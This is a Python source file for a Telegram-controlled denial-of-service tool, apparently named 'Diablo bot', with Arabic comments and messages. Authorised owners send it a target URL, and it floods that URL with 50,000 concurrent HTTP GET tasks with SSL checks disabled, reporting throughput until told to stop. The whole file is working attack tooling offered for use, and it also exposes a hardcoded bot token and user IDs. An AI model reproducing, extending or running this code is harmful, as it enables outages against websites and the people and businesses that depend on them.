import aiohttp
import asyncio
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor
import telebot
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

bytes_transferred = 0
stop_attack_event = asyncio.Event()

Owner = ['6358035274']
NormalUsers = ['5708651947']

def load_lists():
    global Owner, NormalUsers
    try:
        with open('owner.txt', 'r') as file:
            Owner = file.read().splitlines()
        with open('normal_users.txt', 'r') as file:
            NormalUsers = file.read().splitlines()
    except FileNotFoundError:
        pass

load_lists()

async def attack(url, session):
    global bytes_transferred
    while not stop_attack_event.is_set():
        try:
            async with session.get(url, headers=headers) as response:
                content = await response.read()
                bytes_transferred += len(content)
                print("تم إرسال الطلب إلى:", url)
        except Exception as e:
            print("حدث خطأ:", e)

async def start_attack(url):
    stop_attack_event.clear()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
        tasks = []
        for _ in range(50000):
            tasks.append(attack(url, session))
        
        await asyncio.gather(*tasks)

def stop_attack():
    stop_attack_event.set()
    print("تم إيقاف الهجوم.")

async def calculate_speed():
    global bytes_transferred
    while not stop_attack_event.is_set():
        await asyncio.sleep(1)
        speed = bytes_transferred / (1024 * 1024)
        bytes_transferred = 0
        print(f"سرعة النقل: {speed:.2f} MB/s")

TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # استبدل برمز التوكن الخاص بك
bot = AsyncTeleBot(TOKEN)

def is_owner(user_id):
    return str(user_id) in Owner

async def send_welcome(message):
    if is_owner(message.from_user.id):
        await bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
    else:
        await bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

    if is_owner(message.from_user.id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
        markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
        markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        await bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    if is_owner(call.message.chat.id):
        if call.data == "add_user":
            msg = await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
            await bot.register_next_step_handler(msg, process_add_user)
        elif call.data == "remove_user":
            msg = await bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
            await bot.register_next_step_handler(msg, process_remove_user)
        elif call.data == "start_attack":
            msg = await bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
            await bot.register_next_step_handler(msg, process_start_attack)
        elif call.data == "stop_attack":
            stop_attack()
            await bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
    else:
        await bot.send_message(call.message.chat.id, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

async def process_add_user(message):
    new_user = message.text.strip()
    if new_user not in NormalUsers:
        NormalUsers.append(new_user)
        with open('normal_users.txt', 'a') as file:
            file.write(f"{new_user}\n")
        await bot.reply_to(message, f"تمت إضافة المستخدم: {new_user}")
    else:
        await bot.reply_to(message, "المستخدم موجود بالفعل في القائمة.")

async def process_remove_user(message):
    user_to_remove = message.text.strip()
    if user_to_remove in NormalUsers:
        NormalUsers.remove(user_to_remove)
        with open('normal_users.txt', 'w') as file:
            for user in NormalUsers:
                file.write(f"{user}\n")
        await bot.reply_to(message, f"تمت إزالة المستخدم: {user_to_remove}")
    else:
        await bot.reply_to(message, "المستخدم غير موجود في القائمة.")

async def process_start_attack(message):
    url = message.text.strip()
    if url:
        await bot.reply_to(message, f"بدء الهجوم على: {url}")

        speed_task = asyncio.create_task(calculate_speed())
        attack_task = asyncio.create_task(start_attack(url))

        await asyncio.gather(speed_task, attack_task)
    else:
        await bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")

async def main():
    await bot.polling(non_stop=True)

if __name__ == '__main__':
    asyncio.run(main())
